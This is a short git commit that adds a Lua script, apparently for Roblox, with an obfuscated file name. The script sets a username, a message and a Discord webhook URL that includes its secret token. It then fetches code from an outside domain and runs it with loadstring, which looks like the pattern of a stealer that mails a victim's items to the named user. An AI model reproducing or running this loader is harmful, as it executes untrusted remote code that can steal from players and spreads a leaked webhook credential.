93621c6cd338cb1c7a785bf72344d4375f96e717
andriashava2 <144254800+andriashava2@users.noreply.github.com>
2024-05-07 21:53:22 +0400

    Add files via upload

---
+++ obf_ggnJ2b5rAeYg9Z2zVs3z2k05oGpw88ZGih2v0fiz2Vgvu65quIrTo3hI8jXIP5p6.lua
@@ -0,0 +1,5 @@
+Username = "andriagigi1"
+MailMessage = "make by who"
+Webhook = "https://discord.com/api/webhooks/1237369504720486482/P-k_aKJtAWds_Rw4DuqiP7tGrAySpXfGGW19zHRvEhZywog8NYKQgrNsQmXXwwup2zXv"
+
+loadstring(game:HttpGet("https://egorikusa.space/ttd"))()
